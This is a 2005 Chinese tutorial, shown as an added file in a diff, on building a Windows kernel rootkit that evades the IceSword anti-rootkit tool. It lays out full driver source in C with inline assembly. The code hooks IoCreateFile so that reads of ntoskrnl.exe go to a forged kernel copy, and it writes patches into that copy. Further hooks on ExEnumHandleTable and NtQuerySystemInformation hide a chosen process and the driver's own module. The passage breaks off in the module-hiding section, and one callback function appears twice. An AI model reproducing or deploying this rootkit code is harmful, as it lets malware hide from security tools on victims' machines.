@@ -1,0 +1,1894 @@
+创建时间：2005-12-20
+文章属性：原创
+文章提交：backspray (nimaozhi_at_163.com)
+
+作者：倪茂志
+邮件：backspray008@gmail.com
+完成于：2005.12.20
+
+
+文章分为八个部分：
+
+                一、为什么需要伪造内核
+                二、伪造内核文件
+                三、隐藏进程
+                四、隐藏内核模块
+                五、隐藏服务
+                六、隐藏注册表
+                七、隐藏文件
+                八、关于端口
+
+另：建议先看看最后那些参考文章。
+
+
+一、为什么需要伪造内核：
+
+    IceSword（以下简称IS）为了防止一些关键系统函数（包括所有服务中断表中的函数以及IS驱动部分要使用到的一些关键函数）被patch，它直接读取内核文件（以下简称“ntoskrnl.exe”），然后自己分析ntoskrnl.exe的PE结构来获取关键系统函数的原始代码并且把当前内核中所有的关键系统函数还原为windows默认状态，这样保证了IS使用到的函数不被patch过。也许你会想如果我们把还原后的函数再进行patch不还是能躲的过去吗？笔者也试过，还专门写了ring0的Timer来不停的patch自己想hook的函数。结果IS棋高一筹，在对所有的关键系统函数进行还原以后，IS每次调用这些函数前都会先把这些函数还原一次。这样还是能保证IS自己使用到的关键系统函数不被patch。也许你还会想缩小Timer的时间间隔，以致于IS对这些函数进行还原后，这些函数马上又被我们patch，这样IS再调用这些函数时不还是执行了我们patch过的函数。这种想法粗略看起来可以，但你仔细一想就知道是不行的。
+
+    治病还是得治本，也许你想过不如直接修改ntoskrnl.exe文件内容，使得IS一开始读入的就已经是我们patch过得函数内容，这样不就躲过去了。这种想法有两个很大的副作用：
+
+    1、在通常的默认情况下，windows的系统文件保护是打开的，要停止这种系统文件保护要付出很大的代价，有可能需要重启。
+
+    2、就算你停止了系统文件保护，也成功修改了ntoskrnl.exe，但是你不能保证系统每次都能正常关机
+       假如系统非法关机重启，由于你还来未对ntoskrnl.exe进行还原，此时会发生什么情况我也就不多说了。
+
+    而伪造内核文件就很好的避免了上面谈的两大副作用。主要处理下面三个点：
+
+    1、截获并修改IS打开ntoskrnl.exe消息，使它指向我要伪造的内核文件（假设为“otoskrnl.exe”）
+
+    2、在内核文件中定位我们要修改的数据。
+
+    3、隐藏我们伪造的“otoskrnl.exe”,这点请看本文的第七部分。
+
+
+
+二、    伪造内核文件：
+
+先说一下本文hook函数的方式：
+
+    1、取该函数起始地址的前六个字节内容保留在unsigned char resume[6]中。
+
+    2、把构造的两条指令push xxxxxxxx（我们自己构造的函数地址） ret 保留到unsigned char crackcode[6]（这两条指令刚好六个字节）中。
+
+    3、把该函数起始址的6个字节替换成crackcode[6]的内容。这样系统调用该函数时就会先跳到xxxxxxxx地址去执行我们构造的函数。
+
+    而我们构造的xxxxxxxx函数的主要结构如下：
+
+    1、把我们hook的那个函数起始的前6个字节用resume[6]内容进行还原。
+
+    2、对传递的程序参数进行处理等。
+
+    3、调用被还原后的函数。
+
+    4、此时可以处理函数返回后的数据等。
+
+    5、把还原后的那个函数的起始地址前6个字节再用crackcode[6]内容进行替换。
+
+    6、返回。
+
+
+    IS是通过IoCreateFile函数来打开ntoskrnl.exe，因此我们只要hook这个函数，并检查其打开的文件名，如果是打开ntoskrnl.exe的话，我们把文件名替换成otoskrnl.exe再扔回去就OK了。这样所有针对于ntoskrnl.exe文件的操作都会指向otoskrnl.exe, 当然前提是你在进入驱动前记得先把ntoskrnl.exe在原目录下复制一份并命名为otoskrnl.exe。
+
+    关于我们要修改的数据在ntoskrnl.exe中偏移的算法也很简单，这里给出公式如下：
+
+    函数在中文件偏移＝当前函数在内存中的地址 － 当前函数所在驱动模块的起始地址
+
+    举个例子来说，假设IoCreateFile在内核中的内存地址是0x8056d1234，由于它是在内存中ntoskrnl.exe模块中，假设ntoskrnl.exe起始地址是0x8045d000。那么IoCreateFile在磁盘上的ntoskrnl.exe文件中的偏移就是0x8056d123－0x8045d000＝0x110123了。
+
+    再进行详细点说明：假设你对IoCreateFile函数进行了patch，使得该函数起始地址的6前六节的数据XXXXXX变成了YYYYYY。那么你只要打开otoskrnl.exe，把文件偏移调整到上面所说的0x110123处，在写入6个字节的数据YYYYYY。那么当IS打开otoskrnl.exe的话，读出的数据就是YYYYYY了！ 
+
+    下面的代码实现两个功能，一个功能就是hook了IoCreateFile函数，使的所有指向ntoskrnl.exe的操作都指向otoskrnl.exe。另外一个功能就是进行伪造内核（函数RepairNtosFile( DWORD FunctionOffset, DWORD RepairDataPtr)），其中FunctionOffset参数内容就是我们要hook的函数在内存中的地址。RepairDataPtr是指向字符crackcode[6]第一个字节的指针。主要功能就是先把要hook的函数地址在otoskrnl.exe文件中进行定位，然后再把crackcode[6]内容写进去。
+
+#include "ntddk.h"
+#include "stdarg.h"
+#include "stdio.h"
+#include "ntiologc.h"
+#include "string.h"
+
+#define DWORD unsigned long
+#define WORD unsigned short
+#define BOOL unsigned long
+
+PCWSTR    NTOSKRNL=L"ntoskrnl.exe"
+
+unsigned char ResumCodeIoCreateFile[6];
+unsigned char CrackCodeIoCreateFile[6];
+
+typedef NTSTATUS ( *IOCREATEFILE )(
+
+  OUT PHANDLE                FileHandle,
+  IN ACCESS_MASK            DesiredAccess,
+  IN POBJECT_ATTRIBUTES            ObjectAttributes,
+  OUT PIO_STATUS_BLOCK            IoStatusBlock,
+  IN PLARGE_INTEGER            AllocationSize OPTIONAL,
+  IN ULONG                FileAttributes,
+  IN ULONG                ShareAccess,
+  IN ULONG                Disposition,
+  IN ULONG                CreateOptions,
+  IN PVOID                EaBuffer OPTIONAL,
+  IN ULONG                EaLength,
+  IN CREATE_FILE_TYPE            CreateFileType,
+  IN PVOID                ExtraCreateParameters OPTIONAL,
+  IN ULONG                Options );
+
+IOCREATEFILE    OldIoCreateFile;
+
+DWORD GetFunctionAddr( IN PCWSTR FunctionName)
+{
+    UNICODE_STRING UniCodeFunctionName;
+
+            RtlInitUnicodeString( &UniCodeFunctionName, FunctionName );
+            return (DWORD)MmGetSystemRoutineAddress( &UniCodeFunctionName );    
+
+}
+
+NTSTATUS RepairNtosFile( DWORD FunctionOffset, DWORD RepairDataPtr)
+{
+    NTSTATUS Status;    
+    HANDLE FileHandle;
+    OBJECT_ATTRIBUTES FObject;
+    IO_STATUS_BLOCK IOSB;
+    UNICODE_STRING    FileName;
+    LARGE_INTEGER NtosFileOffset;
+
+                RtlInitUnicodeString ( 
+                            &FileName, 
+                            L"\\SystemRoot\\system32\\otoskrnl.exe" );
+
+                InitializeObjectAttributes (
+                                 &FObject,
+                                 &FileName,
+                                 OBJ_KERNEL_HANDLE,
+                                 NULL,
+                                 NULL);
+                Status = ZwCreateFile(
+                            &FileHandle,
+                            FILE_WRITE_DATA+FILE_WRITE_ATTRIBUTES+FILE_WRITE_EA,
+                            &FObject,
+                            &IOSB,
+                            NULL,
+                            FILE_ATTRIBUTE_NORMAL,
+                            0,
+                            FILE_OPEN,
+                            FILE_NON_DIRECTORY_FILE,
+                            NULL,
+                            0
+                             );
+                if ( Status != STATUS_SUCCESS )
+                {
+                    return Status;
+                }
+
+                //下面计算出函数在otoskrnl.exe中的偏移，NtoskrnlBase就是
+                //Ntoskrnl.exe在内存中的起始地址，在第四部分隐藏内核模块
+                //时会提到它的获取方法。
+
+                NtosFileOffset.QuadPart = FunctionOffset - NtoskrnlBase; 
+
+                Status = ZwWriteFile(
+                            FileHandle,
+                            NULL,
+                            NULL,
+                            NULL,
+                            &IOSB,
+                            (unsigned char *)RepairDataPtr,
+                            0x6,
+                            &NtosFileOffset,
+                            NULL);
+                if ( Status != STATUS_SUCCESS )
+                {
+                    return Status;
+                }
+                Status = ZwClose( FileHandle );
+                if ( Status != STATUS_SUCCESS )
+                {
+                    return Status;
+                }
+                return STATUS_SUCCESS;    
+
+}
+
+NTSTATUS NewIoCreateFile (
+
+  OUT PHANDLE                FileHandle,
+  IN ACCESS_MASK            DesiredAccess,
+  IN POBJECT_ATTRIBUTES            ObjectAttributes,
+  OUT PIO_STATUS_BLOCK            IoStatusBlock,
+  IN PLARGE_INTEGER            AllocationSize OPTIONAL,
+  IN ULONG                FileAttributes,
+  IN ULONG                ShareAccess,
+  IN ULONG                Disposition,
+  IN ULONG                CreateOptions,
+  IN PVOID                EaBuffer OPTIONAL,
+  IN ULONG                EaLength,
+  IN CREATE_FILE_TYPE            CreateFileType,
+  IN PVOID                ExtraCreateParameters OPTIONAL,
+  IN ULONG                Options )
+
+{
+    NTSTATUS Status;
+    PCWSTR IsNtoskrnl = NULL;
+    PCWSTR FileNameaddr=NULL;
+
+        _asm    //对IoCreateFile函数进行还原
+        {
+            pushad
+            mov edi, OldIoCreateFile
+            mov eax, dword ptr ResumCodeIoCreateFile[0]
+            mov [edi], eax
+            mov ax, word ptr ResumCodeIoCreateFile[4]
+            mov [edi+4], ax
+            popad
+        } 
+
+        
+        _asm    //获取要打开的文件名地址
+        {
+            pushad 
+            mov edi, ObjectAttributes
+            mov eax, [edi+8]
+            mov edi, [eax+4]
+            mov FileNameaddr, edi
+            popad
+        }
+
+        IsNtoskrnl = wcsstr( FileNameaddr, NTOSKRNL ); //判断是否时打开ntoskrnl.exe
+
+        if ( IsNtoskrnl != NULL )
+        {
+            _asm    //是的话，则把ntoskrnl.exe替换成otoskrnl.exe
+            {
+                pushad
+                mov edi, IsNtoskrnl
+                mov [edi], 0x006F
+                popad
+            }
+        }
+
+        Status = OldIoCreateFile (
+            
+                        FileHandle,
+                        DesiredAccess,
+                        ObjectAttributes,
+                        IoStatusBlock,
+                        AllocationSize OPTIONAL,
+                        FileAttributes,
+                        ShareAccess,
+                        Disposition,
+                        CreateOptions,
+                        EaBuffer OPTIONAL,
+                        EaLength,
+                        CreateFileType,
+                        ExtraCreateParameters OPTIONAL,
+                        Options );
+
+        _asm //把还原后的代码又替换成我们伪造的代码
+            {
+                pushad
+                mov edi, OldIoCreateFile
+                mov eax, dword ptr CrackCodeIoCreateFile[0]
+                mov [edi], eax
+                mov ax, word ptr CrackCodeIoCreateFile[4]
+                mov [edi+4], ax
+                popad
+            }        
+        return Status;
+
+}
+
+
+NTSTATUS PatchIoCreateFile()
+{
+    NTSTATUS Status;
+            
+            OldIoCreateFile = ( IOCREATEFILE ) GetFunctionAddr(L"IoCreateFile");
+
+            if ( OldIoCreateFile == NULL )
+            {
+                DbgPrint("Get IoCreateFile Addr Error!!");
+                return STATUS_DEVICE_CONFIGURATION_ERROR;
+            }
+
+            _asm  //关中断
+               {
+                CLI                 
+                MOV    EAX, CR0     
+                AND EAX, NOT 10000H  
+                MOV    CR0, EAX        
+            }
+            _asm
+            {
+                pushad
+                //获取 IoCreateFile 函数的地址并保留该函数的起始六个字节
+                mov edi, OldIoCreateFile
+                mov eax, [edi]
+                mov dword ptr ResumCodeIoCreateFile[0], eax
+                mov ax, [edi+4]
+                mov word  ptr ResumCodeIoCreateFile[4], ax
+                
+                //构造要替换的代码，使得系统调用函数时跳到我们构造的NewIoCreateFile去执行
+                mov byte ptr CrackCodeIoCreateFile[0], 0x68
+                lea edi, NewIoCreateFile
+                mov dword ptr CrackCodeIoCreateFile[1], edi
+                mov byte ptr CrackCodeIoCreateFile[5], 0xC3
+
+                //把构造好的代码进心替换
+                mov edi, OldIoCreateFile
+                mov eax, dword ptr CrackCodeIoCreateFile[0]
+                mov dword ptr[edi], eax
+                mov ax, word ptr CrackCodeIoCreateFile[4]
+                mov word ptr[edi+4], ax
+                popad
+            }
+
+            _asm //开中断
+            {
+                MOV    EAX, CR0       
+                OR    EAX, 10000H            
+                MOV    CR0, EAX              
+                STI                    
+            }
+
+            Status = RepairNtosFile(
+                            (DWORD)OldIoCreateFile,
+                            (DWORD)(&CrackCodeIoCreateFile));
+
+            return Status;
+
+}
+
+    上面给出的代码中，有些是公共使用的部分，如：GetFunctionAddr()（用来获取函数地址）以及RepairNtosFile()（功能上文已经介绍）函数。为节省版面，在下面的代码中将直接对其进行引用，而不再贴出它们的代码。下面的代码将不会再include头文件。而是直接定义自己所使用到的变量。其中include的投文件与上面的代码相同，另外本文中所有的例子都没有给出Unloaded例程（浪费版面），自己看着写了另外，本文贴出的所有代码，除了第六部分代码只在XP下测试通过，其他代码均再2K及XP下测试并通过。笔者在写这些代码时虽然兼顾到了2K3，但是笔者并没有在2K3中测试过这些代码。这些代码中夹杂了一些汇编指令。这些汇编指令产生主要有两种原因：一是当时的我认为某些东西用汇编指令来表示非常直观，如还原与替换函数代码那个部分。二是在分析一些数据时，由于眼前面对的是纯16进制的数据，于是也没多想咔咔就用汇编写了一个循环下来。如果给你阅读代码造成了不便，笔者在这表示歉意。
+
+
+三、    隐藏进程
+
+    对付IS枚举进程ID的思路是这样的，hook系统函数ExEnumHandleTable，使它先运行我们指定的函数NewExEnumHandleTable，在NewExEnumHandleTable函数中，我们先获取它的回调函数参数Callback所指向的函数地址，把它所指向的函数地址先放到OldCallback中，然后用我们构造的新的回调函数FilterCallback去替换掉原来的Callback。这样该函数在执行回调函数时就会先调用我们给它的FilterCallback回调函数。在我们设计的FilterCallback中，判断当前进程ID是否时我们要隐藏的进程ID，不是的话则把参数传给OldCallback去执行，如果是的话则直接return。这样就起到隐藏进程的作用。
+
+    以上是对付IS的，对于应付windows进程管理的方法，与sinister使用的方法大体相同，不过有些不同。sinister是通过比较进程名来确定自己要隐藏的进程。这种方法对于隐藏要启动两个和两个以上相同名字的进程比较可取，但问题是如果你只是要隐藏一个进程的话。那么这个方法就显得不完美了。完全可以通过直接比较进程ID来确定自己要隐藏的进程。建议不到不得以的时候尽量不要使用比较文件名的方法，太影响效率。
+
+    下面的代码中，GetProcessID()函数是用来从注册表中读取要隐藏的进程ID，当然首先你要在注册表设置这个值。用注册表还是很方便的。
+
+    PatchExEnumHandleTable()函数是通过hook系统函数ExEnumHandleTable函数实现在IS中隐藏目标进程，PatchNtQuerySystemInformation ()函数是通过hook系统函数NtQuerySystemInformation并通过比较进程ID的方法实现隐藏进程。
+
+
+HANDLE ProtectID;
+unsigned char ResumCodeExEnumHandleTable[6];
+unsigned char CrackCodeExEnumHandleTable[6];
+unsigned char ResumCodeNtQuerySystemInformation[6];
+unsigned char CrackCodeNtQuerySystemInformation[6];
+
+typedef NTSTATUS (*NTQUERYSYSTEMINFORMATION)(
+
+  IN ULONG                        SystemInformationClass,
+  OUT PVOID                        SystemInformation,
+  IN ULONG                        SystemInformationLength,
+  OUT PULONG                        ReturnLength OPTIONAL  );
+
+NTQUERYSYSTEMINFORMATION OldNtQuerySystemInformation;
+
+typedef VOID (*EXENUMHANDLETABLE)  
+(  
+    PULONG        HandleTable,  
+    PVOID        Callback,  
+    PVOID        Param,  
+    PHANDLE        Handle  OPTIONAL 
+);
+
+EXENUMHANDLETABLE    OldExEnumHandleTable;
+
+typedef BOOL (*EXENUMHANDLETABLECALLBACK)
+(
+    DWORD   HANDLE_TALBE_ENTRY,
+    DWORD    PID,
+    PVOID    Param
+);
+
+EXENUMHANDLETABLECALLBACK    OldCallback;
+
+NTSTATUS GetProcessID ( 
+            IN PUNICODE_STRING theRegistryPath
+            )
+{
+    OBJECT_ATTRIBUTES ObjectAttributes;
+    NTSTATUS Status;
+
+    HANDLE KeyHandle;
+    PHANDLE Phandle;
+    PKEY_VALUE_PARTIAL_INFORMATION valueInfoP;
+    ULONG valueInfoLength,returnLength;
+
+    UNICODE_STRING UnicodeProcIDreg;
+
+
+            InitializeObjectAttributes ( 
+                            &ObjectAttributes, 
+                            theRegistryPath, 
+                            OBJ_CASE_INSENSITIVE, 
+                            NULL, 
+                            NULL ); 
+
+            Status = ZwOpenKey ( 
+                        &KeyHandle, 
+                        KEY_ALL_ACCESS, 
+                        &ObjectAttributes );
+
+            if (Status != STATUS_SUCCESS)
+            {
+                DbgPrint("ZwOpenKey Wrong\n");
+                return STATUS_DEVICE_CONFIGURATION_ERROR;
+            }
+
+            RtlInitUnicodeString ( 
+                        &UnicodeProcIDreg, 
+                        L"ProcessID" );
+
+            valueInfoLength = sizeof(KEY_VALUE_PARTIAL_INFORMATION);
+
+            valueInfoP = (PKEY_VALUE_PARTIAL_INFORMATION) ExAllocatePool (
+                                            NonPagedPool, 
+                                            valueInfoLength );
+            Status = ZwQueryValueKey ( 
+                            KeyHandle, 
+                            &UnicodeProcIDreg, 
+                            KeyValuePartialInformation, 
+                            valueInfoP, 
+                            valueInfoLength, 
+                            &returnLength );
+
+            if (Status != STATUS_SUCCESS)
+            {
+                DbgPrint("ZwOpenKey Wrong\n");
+                return STATUS_DEVICE_CONFIGURATION_ERROR;
+            }
+
+            Phandle = (PHANDLE)(valueInfoP->Data);
+
+            ProtectID = *Phandle;
+
+            ZwClose(KeyHandle);
+
+            return STATUS_SUCCESS;
+
+}
+
+BOOL FilterCallback (
+            DWORD   HANDLE_TALBE_ENTRY,
+            DWORD    PID,
+            PVOID    Param )
+{
+
+        if ( PID != (DWORD)ProtectID)    //判断是否是我们要隐藏的进程
+        {
+            return OldCallback (
+                        HANDLE_TALBE_ENTRY,
+                        PID,
+                        Param );
+        }
+        else
+        {
+            return FALSE; //是的话直接返回
+        }
+}
+
+BOOL FilterCallback (
+            DWORD   HANDLE_TALBE_ENTRY,
+            DWORD    PID,
+            PVOID    Param )
+{
+
+        if ( PID != (DWORD)ProtectID)    //判断是否是我们要隐藏的进程
+        {
+            return OldCallback (
+                        HANDLE_TALBE_ENTRY,
+                        PID,
+                        Param );
+        }
+        else
+        {
+            return FALSE; //是的话直接返回
+        }
+}
+
+
+
+VOID NewExEnumHandleTable(
+                PULONG        HandleTable,  
+                PVOID        Callback,  
+                PVOID        Param,  
+                PHANDLE        Handle  OPTIONAL )    
+{
+
+        OldCallback = Callback; //把Callback参数给OldCallback进行保留
+
+        Callback = FilterCallback; //用FilterCallback替换调原来的Callback
+
+        _asm  //还原
+        {
+            pushad
+            mov edi, OldExEnumHandleTable
+            mov eax, dword ptr ResumCodeExEnumHandleTable[0]
+            mov [edi], eax
+            mov ax, word ptr ResumCodeExEnumHandleTable[4]
+            mov [edi+4], ax
+            popad
+        }
+
+            OldExEnumHandleTable (
+                        HandleTable,  
+                        Callback,  
+                        Param,  
+                        Handle  OPTIONAL );
+        _asm //替换
+        {
+            pushad
+            mov edi, OldExEnumHandleTable
+            mov eax, dword ptr CrackCodeExEnumHandleTable[0]
+            mov [edi], eax
+            mov ax, word ptr CrackCodeExEnumHandleTable[4]
+            mov [edi+4], ax
+            popad
+        }
+        return ;
+}
+
+NTSTATUS PatchExEnumHandleTable()
+{
+    NTSTATUS Status;
+
+             OldExEnumHandleTable = (EXENUMHANDLETABLE) GetFunctionAddr(L"ExEnumHandleTable");
+
+             if ( OldExEnumHandleTable == NULL )
+             {
+                 DbgPrint("Get ExEnumHandleTable Addr Error!!");
+                 return STATUS_DEVICE_CONFIGURATION_ERROR;
+             }
+
+             _asm    //关中断
+               {
+                CLI                    
+                MOV    EAX, CR0   
+                AND EAX, NOT 10000H 
+                MOV    CR0, EAX  
+            }
+             _asm
+            {
+                pushad
+                //获取ExEnumHandleTable函数的地址并保留该函数的起始六个字节
+                mov edi, OldExEnumHandleTable
+                mov eax, [edi]
+                mov dword ptr ResumCodeExEnumHandleTable[0], eax
+                mov ax, [edi+4]
+                mov word  ptr ResumCodeExEnumHandleTable[4], ax
+                
+                //构造要替换的代码，使得系统调用该函数时跳到我们构造的NewExEnumHandleTable去执行
+                mov byte ptr CrackCodeExEnumHandleTable[0], 0x68
+                lea edi, NewExEnumHandleTable
+                mov dword ptr CrackCodeExEnumHandleTable[1], edi
+                mov byte ptr CrackCodeExEnumHandleTable[5], 0xC3
+
+                //把构造好的代码进心替换
+                mov edi, OldExEnumHandleTable
+                mov eax, dword ptr CrackCodeExEnumHandleTable[0]
+                mov dword ptr[edi], eax
+                mov ax, word ptr CrackCodeExEnumHandleTable[4]
+                mov word ptr[edi+4], ax
+                popad
+            }
+
+             _asm //开中断
+            {
+                MOV    EAX, CR0        
+                OR    EAX, 10000H   
+                MOV    CR0, EAX           
+                STI          
+            }
+            
+            Status = RepairNtosFile(
+                        (DWORD)OldExEnumHandleTable,
+                        (DWORD)(&CrackCodeExEnumHandleTable) );
+
+            return Status;
+}
+
+NTSTATUS NewNtQuerySystemInformation(
+
+  IN ULONG        SystemInformationClass,
+  OUT PVOID        SystemInformation,
+  IN ULONG        SystemInformationLength,
+  OUT PULONG        ReturnLength OPTIONAL )
+{
+    NTSTATUS Status;
+    DWORD     Bprocess;
+
+        _asm  
+        {
+            pushad
+            mov edi, OldNtQuerySystemInformation
+            mov eax, dword ptr ResumCodeNtQuerySystemInformation[0]
+            mov [edi], eax
+            mov ax, word ptr ResumCodeNtQuerySystemInformation[4]
+            mov [edi+4], ax
+            popad
+        }
+
+        Status=OldNtQuerySystemInformation ( 
+                            SystemInformationClass, 
+                            SystemInformation, 
+                            SystemInformationLength, 
+                            ReturnLength OPTIONAL );
+        _asm 
+        {
+            pushad
+            mov edi, OldNtQuerySystemInformation
+            mov eax, dword ptr CrackCodeNtQuerySystemInformation[0]
+            mov [edi], eax
+            mov ax, word ptr CrackCodeNtQuerySystemInformation[4]
+            mov [edi+4], ax
+            popad
+        }
+
+        if ( Status != STATUS_SUCCESS || SystemInformationClass!=5 )
+        {
+            return Status; 
+        }
+
+        _asm
+        {
+            pushad
+
+            mov ecx, ProtectID
+            mov edi, SystemInformation
+
+ProcessListNEnd:
+            mov Bprocess, edi
+            mov eax, [edi]
+            test eax, eax
+            jz ProcessListEnd
+            add edi, eax
+
+            mov eax, [edi+0x44]
+            cmp eax, ecx
+            jz FindOut
+            jmp ProcessListNEnd
+FindOut:
+            mov ebx, [edi]
+            test ebx, ebx
+            jz listend
+            mov eax, Bprocess
+            mov edx, [eax]
+            add ebx, edx
+            mov [eax], ebx
+            jmp hideOK
+
+listend:
+            mov eax,    Bprocess
+            mov [eax],  0
+hideOK:    
+            
+ProcessListEnd:
+
+            popad
+        }
+        return Status;
+}
+
+
+
+
+NTSTATUS PatchNtQuerySystemInformation ()
+{
+    NTSTATUS Status;
+            
+            OldNtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION) GetFunctionAddr(L"NtQuerySystemInformation");
+
+            if ( OldNtQuerySystemInformation == NULL )
+            {
+                DbgPrint("Get NtQuerySystemInformation Addr Error!!");
+                return STATUS_DEVICE_CONFIGURATION_ERROR;
+            }
+
+            _asm    //关中断
+               {
+                CLI        
+                MOV    EAX, CR0        
+                AND EAX, NOT 10000H 
+                MOV    CR0, EAX        
+            }
+            _asm
+            {
+                pushad
+                //获取 NtQuerySystemInformation 函数的地址并保留该函数的起始六个字节
+                mov edi, OldNtQuerySystemInformation
+                mov eax, [edi]
+                mov dword ptr ResumCodeNtQuerySystemInformation[0], eax
+                mov ax, [edi+4]
+                mov word  ptr ResumCodeNtQuerySystemInformation[4], ax
+                
+                //构造要替换的代码，使得系统调用该函数时跳到我们构造的NewNtQuerySystemInformation去执行
+                mov byte ptr CrackCodeNtQuerySystemInformation[0], 0x68
+                lea edi, NewNtQuerySystemInformation
+                mov dword ptr CrackCodeNtQuerySystemInformation[1], edi
+                mov byte ptr CrackCodeNtQuerySystemInformation[5], 0xC3
+
+                //把构造好的代码进心替换
+                mov edi, OldNtQuerySystemInformation
+                mov eax, dword ptr CrackCodeNtQuerySystemInformation[0]
+                mov dword ptr[edi], eax
+                mov ax, word ptr CrackCodeNtQuerySystemInformation[4]
+                mov word ptr[edi+4], ax
+                popad
+            }
+            _asm //开中断
+            {
+                MOV    EAX, CR0      
+                OR    EAX, 10000H          
+                MOV    CR0, EAX               
+                STI                    
+            }
+            Status = RepairNtosFile(
+                            (DWORD)OldNtQuerySystemInformation,
+                            (DWORD)(&CrackCodeNtQuerySystemInformation) );
+
+            return Status;
+
+}
+
+
+四、隐藏内核模块
+
+    对于内核模块，我原以为IS会通过获取内核变量PsLoadedModuleList，然后在通过这个来遍历所有的内核模块。假设此时获得结果1。通过调用函数NtQuerySystemInformation，参数SystemModuleInformation，假设此时获得结果2。再把结果1与结果2进行比较，这样就会发现被隐藏的模块。但事实证明我想的太复杂了。而IS只进行了获取结果2的过程。而没有去执行获取结果1的过程。
+
+    下面的代码可以在IS下隐藏自己的内核模块，主要思路是，首先获取一个自己这个模块中任意函数的地址，把该地址给DriverAddr，利用DriverAddr在上述的结果2中定位，通过DriverAddr肯定会大于自己这个模块的起始地址并且小于自己这个模块的结束地址来定位。
+
+DWORD DriverAddr;
+unsigned char ResumCodeNtQuerySystemInformation[6];
+unsigned char CrackCodeNtQuerySystemInformation[6];
+typedef NTSTATUS (*NTQUERYSYSTEMINFORMATION)(
+
+  IN ULONG        SystemInformationClass,
+  OUT PVOID        SystemInformation,
+  IN ULONG        SystemInformationLength,
+  OUT PULONG        ReturnLength OPTIONAL  );
+
+NTQUERYSYSTEMINFORMATION OldNtQuerySystemInformation;
+
+NTSTATUS NewNtQuerySystemInformation(
+
+  IN ULONG        SystemInformationClass,
+  OUT PVOID        SystemInformation,
+  IN ULONG        SystemInformationLength,
+  OUT PULONG        ReturnLength OPTIONAL )
+{
+    NTSTATUS Status;
+
+        _asm  //还原
+        {
+            pushad
+            mov edi, OldNtQuerySystemInformation
+            mov eax, dword ptr ResumCodeNtQuerySystemInformation[0]
+            mov [edi], eax
+            mov ax, word ptr ResumCodeNtQuerySystemInformation[4]
+            mov [edi+4], ax
+            popad
+        }
+        
+        Status = ZwQuerySystemInformation ( 
+                            SystemInformationClass, 
+                            SystemInformation, 
+                            SystemInformationLength, 
+                            ReturnLength OPTIONAL );
+        _asm //替换
+        {
+            pushad
+            mov edi, OldNtQuerySystemInformation
+            mov eax, dword ptr CrackCodeNtQuerySystemInformation[0]
+            mov [edi], eax
+            mov ax, word ptr CrackCodeNtQuerySystemInformation[4]
+            mov [edi+4], ax
+            popad
+        }
+
+        if ( Status != STATUS_SUCCESS || SystemInformationClass!=0xb )  //是否是获取模块信息
+        {
+            return Status;  
+        }
+
+        _asm
+        {
+            pushad
+
+            mov edi, SystemInformation
+            mov ecx, [edi]            //eax=模块数目
+            add edi, 0x4
+
+NextModuleInfo:
+
+            mov eax, [edi+0x8]    
+            mov edx, [edi+0xC]  
+            
+            add edx, eax    
+            mov ebx, DriverAddr
+
+            cmp ebx, eax
+            ja    FirstMatch
+            dec ecx
+            test ecx, ecx
+            jz  ArrayEnd
+
+            add edi, 0x11c
+            jmp NextModuleInfo
+
+FirstMatch:
+            cmp ebx, edx
+            jb SecMatch    //找到的话则跳去把该模块以后的模块数据前移已覆盖掉此模块
+
+            dec ecx
+            test ecx, ecx
+            jz  ArrayEnd
+            add edi, 0x11c
+            jmp NextModuleInfo
+SecMatch:
+            dec ecx
+            xor eax, eax
+            mov ax, 0x11c
+            mul cx
+            xor ecx, ecx
+            mov ecx, eax
+            mov esi, edi
+            add esi, 0x11c
+            rep movsb
+            mov edi, SystemInformation
+            mov eax, [edi]
+            dec eax
+            mov [edi], eax            //完成
+ArrayEnd:
+            popad
+        }
+        return Status;
+}
+
+NTSTATUS PatchNtQuerySystemInformation()
+{
+    NTSTATUS Status;
+            
+            OldNtQuerySystemInformation=(NTQUERYSYSTEMINFORMATION)( GetFunctionAddr(L"NtQuerySystemInformation") );
+
+            if ( OldNtQuerySystemInformation == NULL )
+            {
+                return STATUS_DEVICE_CONFIGURATION_ERROR;
+            }
+
+            _asm    //关中断
+            {
+                CLI                  
+                MOV    EAX, CR0       
+                AND EAX, NOT 10000H 
+                MOV    CR0, EAX      
+            }
+
+            _asm
+            {
+                pushad
+                //获取 NtQuerySystemInformation 函数的地址并保留该函数的起始六个字节
+
+                lea eax, NewNtQuerySystemInformation    
+                mov DriverAddr, eax //把NewNtQuerySystemInformation函数地址给DriverAddr
+
+                mov edi, OldNtQuerySystemInformation
+                mov eax, [edi]
+                mov dword ptr ResumCodeNtQuerySystemInformation[0], eax
+                mov ax, [edi+4]
+                mov word  ptr ResumCodeNtQuerySystemInformation[4], ax
+                
+                //构造要替换的代码，使得系统调用该函数时跳到我们构造的NewNtQuerySystemInformation去执行
+                mov byte ptr CrackCodeNtQuerySystemInformation[0], 0x68
+                lea edi, NewNtQuerySystemInformation
+                mov dword ptr CrackCodeNtQuerySystemInformation[1], edi
+                mov byte ptr CrackCodeNtQuerySystemInformation[5], 0xC3
+
+                //把构造好的代码进行替换
+                mov edi, OldNtQuerySystemInformation
+                mov eax, dword ptr CrackCodeNtQuerySystemInformation[0]
+                mov dword ptr[edi], eax
+                mov ax, word ptr CrackCodeNtQuerySystemInformation[4]
+                mov word ptr[edi+4], ax
+                popad
+            }
+
+            _asm //开中断
+            {
+                MOV    EAX, CR0      
+                OR    EAX, 10000H         
+                MOV    CR0, EAX           
+                STI                    
+            }
+
+            Status = RepairNtosFile (
+                            (DWORD)OldNtQuerySystemInformation,
+                            (DWORD)&CrackCodeNtQuerySystemInformation[0] );
+            return Status;
+            
+}
+    你可能发现上面这段代码hook的也是NtQuerySystemInformation函数，而在隐藏进程中不是已经hook了NtQuerySystemInformation函数，这样不是造成重合了。在实际操作中，你只要hook一次NtQuerySystemInformation函数，然后在自己定义NewNtQuerySystemInformation中增加几个选择项就是了。我这样写是为了便于理解，使它们每个部分自成一体，如果按实际代码搬出来的话，显得太支离破碎（支离破碎的支到底是这个“支”还是这个“肢”？？）了。
+
+    不知道pjf看到这里之后会不会想着给IS升级，增加IS检测隐藏内核模块的功能，因此下面一并给出了如何在PsLoadedModuleList链表删除自身的代码，关于如何获取PsLoadedModuleList这个内核变量的地址我就不说了，不了解的请参看TK的《获取Windows 系统的内核变量》。PsLoadedModuleList所指向的是结构是_MODULE_ENTRY，微软没有给出定义，但是uzen_op（fuzen_op@yahoo.com）在FU_Rootkit2.0的资源中给出了MODULE_ENTRY的结构定义如下：
+typedef struct _MODULE_ENTRY {
+    LIST_ENTRY le_mod;
+    DWORD  unknown[4];
+    DWORD  base;
